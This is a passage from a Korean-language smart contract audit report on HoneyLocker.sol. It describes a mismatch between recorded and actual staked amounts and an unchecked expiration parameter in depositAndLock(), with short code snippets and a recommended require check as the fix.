            address(KODIAK_STAKING),
>           10000e50,
>           abi.encodeWithSelector(bytes4(keccak256("stakeLocked(uint256,uint256)")), 1e18, 30 days)
        );
```

`staked[_LPToken][_stakingContract]`는 10000e50이 되지만 실제 스테이크 금액은 1e18입니다.

마찬가지로 `unstake()`에서 `_amount` 매개변수는 0으로 설정될 수 있으며 실제 언스테이크 금액은 1e18로 설정됩니다(또는 Kodiak의 경우 `withdrawLockedAll()`은 Kodiak 스테이킹 계약의 모든 LP 토큰을 인출합니다).

`staked` 매핑이 필요한 경우 대신 `address(honeyLocker)` 잔액을 사용하여 스테이킹된 금액을 확인하는 것을 고려하십시오. 호출 전후의 잔액을 확인하고 그에 따라 `staked` 매핑을 업데이트하십시오.

# [L-10] 만료 타이밍을 현재 시간 이전으로 설정할 수 있음 (Expiration timing can be set to before the current time)

HoneyLocker.sol에 LP 토큰을 예치할 때 사용자는 `depositAndLock()`을 호출하고 `_expiration` 시간을 설정합니다. 이 `_expiration` 매개변수는 확인되지 않으므로 호출자는 `block.timestamp` 이전 시간을 설정할 수 있습니다.

```
> function depositAndLock(address _LPToken, uint256 _amountOrId, uint256 _expiration) external onlyOwnerOrMigratingVault {
        // we only allow subsequent deposits of the same token IF the
        // expiration is the same or greater
>       if (!unlocked && expirations[_LPToken] != 0 && _expiration < expirations[_LPToken]) {
            revert ExpirationNotMatching();
        }
        // set expiration to 1 so token is marked as lp token
        expirations[_LPToken] = unlocked ? 1 : _expiration;
        // using transferFrom from ERC721 because same signature for ERC20
        // with the difference that ERC721 doesn't expect a return value
        ERC721(_LPToken).transferFrom(msg.sender, address(this), _amountOrId);
```

그런 다음 `block.timestamp > expiration`이면 토큰을 인출할 수 있습니다.

```
 function withdrawLPToken(address _LPToken, uint256 _amount) external onlyOwner {
        if (expirations[_LPToken] == 0) revert HasToBeLPToken();
        // only withdraw if expiration is OK
>       if (block.timestamp < expirations[_LPToken]) revert NotExpiredYet();
        ERC20(_LPToken).transfer(msg.sender, _amount);
        emit Withdrawn(_LPToken, _amount);
    }
```

`depositAndLock()`에 확인을 추가하는 것이 좋습니다.

```
require(_expiration > block.timestamp, "Wrong time");
```
